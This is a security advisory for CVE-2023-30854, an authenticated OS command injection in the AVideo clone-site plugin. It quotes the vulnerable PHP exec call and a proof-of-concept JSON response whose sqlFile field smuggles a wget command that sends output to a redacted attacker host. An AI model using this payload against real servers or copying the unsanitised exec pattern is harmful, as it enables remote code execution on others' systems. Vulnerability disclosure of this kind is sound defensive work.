# [H] Remote code injection in wwbn/avideo

## Summary
Severity: High
Advisory: GHSA-6vrj-ph27-qfp3
CVE: CVE-2023-30854
CWE: CWE-78
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2023-04-27
Source: https://github.com/advisories/GHSA-6vrj-ph27-qfp3
Type: github-advisory

## Affected
- Packagist: `wwbn/avideo` — affected >=0 <12.4

## Details
# WWBN Avideo Authenticated RCE - OS Command Injection

## Description

An OS Command Injection vulnerability in an Authenticated endpoint `/plugin/CloneSite/cloneClient.json.php` allows attackers to achieve Remote Code Execution.

Vulnerable code:

```php
$cmd = "wget -O {$clonesDir}{$json->sqlFile} {$objClone->cloneSiteURL}videos/cache/clones/{$json->sqlFile}";
$log->add("Clone (2 of {$totalSteps}): Geting MySQL Dump file");
exec($cmd . " 2>&1", $output, $return_val);
```

We can control `$objClone->cloneSiteURL`  through the admin panel clone site feature.

`/plugin/CloneSite/cloneClient.json.php` sends a GET Request to `{$objClone->cloneSiteURL}/plugin/CloneSite/cloneServer.json.php`. I hosted a  specially crafted `cloneServer.json.php` that prints the following JSON data

```JSON
{"error":false,"msg":"","url":"https:\/\/REDACTED/\/","key":"REDACTED","useRsync":1,"videosDir":"\/var\/www\/html\/[demo.avideo.com](http://demo.avideo.com/)\/videos\/","sqlFile":"Clone_mysqlDump_644ab263e62d6.sql; wget [http://REDACTED:4444/`pwd`](http://redacted:4444/pwd) ;#","videoFiles":[],"photoFiles":[]}
```

Send a GET Request to `/plugin/CloneSite/cloneClient.json.php` then remote code execution is achieved.

![rce](https://i.ibb.co/h14gQtn/rce.png)

## References
- https://github.com/WWBN/AVideo/security/advisories/GHSA-6vrj-ph27-qfp3
- https://nvd.nist.gov/vuln/detail/CVE-2023-30854
- https://github.com/WWBN/AVideo/commit/020415d22f36d93ed865eb61994b49caa0f7f90a
- https://github.com/WWBN/AVideo
